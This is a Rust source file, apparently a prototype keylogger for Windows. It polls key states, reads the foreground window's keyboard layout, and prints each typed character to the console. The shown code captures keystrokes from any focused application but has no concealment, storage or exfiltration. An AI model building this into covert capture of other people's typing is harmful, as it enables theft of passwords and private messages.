use device_query::{DeviceQuery, DeviceState, Keycode};
use std::thread;
use std::time::Duration;
use std::sync::Mutex;
use std::sync::Arc;

use windows::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeyState, ToUnicode, GetKeyboardState, GetKeyboardLayout};
use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
use std::convert::TryFrom;
use windows::core::PWSTR;
use windows::core::Result;
use windows::Win32::System::Threading::GetCurrentThreadId;
use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId};

struct Keylogger2 {
    last_key: Option<i32>, // Stores the last key that was pressed
}

// Key represents a single key entered by the user
#[derive(Debug)]
struct Key {
    empty: bool, // Indicates if a key is pressed or not
    rune: Option<char>, // The character representation of the key
    keycode: i32,  // The keycode of the key
}

impl Key {
    fn new() -> Self {
        Self {
            empty: true,
            rune: None,
            keycode: 0
        }
    }
}

fn main() {
    loop {
        let next = get_next();
        println!("next: {:?}", next);

    }
}

fn get_next() -> Key {
    let mut keyboard_state = [0u8; 256];

    let next = wait_for_next_key();
    println!("next: {:?}", next);
    let t =  unsafe { GetKeyboardState(&mut keyboard_state) };

    // Get the handle to the foreground window
    let foreground_window = unsafe { GetForegroundWindow() };
    // Get the thread id of the foreground window
    let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
    // Get the keyboard layout for the foreground thread
    let layout = unsafe { GetKeyboardLayout(thread_id) };
    let mut pwszbuff = [0u16; 1]; // Create a buffer
    // Use the correct arguments for ToUnicodeEx
    let code = unsafe {
        ToUnicodeEx(
            next as u32, // Use the key code as `wvirtkey`
            0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
            &keyboard_state,
            &mut pwszbuff, // Pass the buffer
            0, // `wflags`, always 0 for this usage
            layout
        )
    };
    // println!("typeing {}: {} kb: {:?}", i, code, layout);
    println!(">>> buff {:?}",  pwszbuff);

    let mut key = Key::new();
    key.empty = false;
    key.keycode = next;

    // let code_point: u32 = 1567; ///ssssfqwewerdfgrtasd
    let code_point: u32 = pwszbuff[0] as u32;
    if let Some(character) = char::from_u32(code_point) {
        // let character = character.to_string();
        if character.is_control() {
            println!("{} is a control character", code_point);
            key.empty = true;
        } else {
            key.rune = Some(character);
            let character_string = character.to_string();
            println!("{}", character_string);
        }
        // println!(">>> {}", character_string);
    } else {
        key.empty = true;
        println!("Invalid Unicode code point: {}", code_point);
    };

    key
}
fn wait_for_next_key() -> i32 {
    let keycodes = get_main_key_codes();
    let mut last_key: Option<i32> = None;
    loop {
        for &key in keycodes.iter() {
            let key_code = unsafe { GetAsyncKeyState(key) };
            if key_code == 0 {
                if let Some(last) = last_key {
                    if last == key {
                        return key;
                    }
                }
                continue;
            }

            // The shift is for only pressed key
            if key_code != -32768 || key_code & (1 << 15) == 0 {
                continue;
            }
            last_key = Some(key);
        }
        thread::sleep(Duration::from_millis(5));
    }
}

fn get_main_key_codes() -> Vec<i32> {
    let mut keycodes = vec![];
    // Iterate from 0 to 255 inclusive
    for i in 0..=255 {
        if is_known_win_key(i){
            keycodes.push(i);
        }
    }
    keycodes
}

fn is_known_win_key(win_key1: i32) -> bool {
    // let winuser = KeyboardAndMouse::;
    use windows::Win32::UI::Input::KeyboardAndMouse::*;
    // let win_key = VIRTUAL_KEY::try_from(win_key1 as u16).unwrap();
    let win_key = VIRTUAL_KEY(win_key1 as u16);
    match win_key {
        VK_F1 => true,
        VK_F2 => true,
        VK_F3 => true,
        VK_F4 => true,
        VK_F5 => true,
        VK_F6 => true,
        VK_F7 => true,
        VK_F8 => true,
        VK_F9 => true,
        VK_F10 => true,
        VK_F11 => true,
        VK_F12 => true,
        VK_NUMPAD0 => true,
        VK_NUMPAD1 => true,
        VK_NUMPAD2 => true,
        VK_NUMPAD3 => true,
        VK_NUMPAD4 => true,
        VK_NUMPAD5 => true,
        VK_NUMPAD6 => true,
        VK_NUMPAD7 => true,
        VK_NUMPAD8 => true,
        VK_NUMPAD9 => true,
        VK_ADD => true,
        VK_SUBTRACT => true,
        VK_DIVIDE => true,
        VK_MULTIPLY => true,
        VK_SPACE => true,
        VK_LCONTROL => true,
        VK_RCONTROL => true,
        VK_LSHIFT => true,
        VK_RSHIFT => true,
        VK_LMENU => true,
        VK_RMENU => true,
        VK_LWIN => true,
        VK_RWIN => true,
        VK_RETURN => true,
        VK_ESCAPE => true,
        VK_UP => true,
        VK_DOWN => true,
        VK_LEFT => true,
        VK_RIGHT => true,
        VK_BACK => true,
        VK_CAPITAL => true,
        VK_TAB => true,
        VK_HOME => true,
        VK_END => true,
        VK_PRIOR => true,
        VK_NEXT => true,
        VK_INSERT => true,
        VK_DELETE => true,
        VK_OEM_3 => true,
        VK_OEM_MINUS => true,
        VK_OEM_PLUS => true,
        VK_OEM_4 => true,
        VK_OEM_6 => true,
        VK_OEM_5 => true,
        VK_OEM_1 => true,
        VK_OEM_7 => true,
        VK_OEM_COMMA => true,
        VK_OEM_PERIOD => true,
        VK_OEM_2 => true,

        _ => {
            let win_key = win_key.0 as u8;
            match win_key as char {
                '0'..='9' | 'A'..='Z' => true,
                _ => false,
            }
        }
    }
}
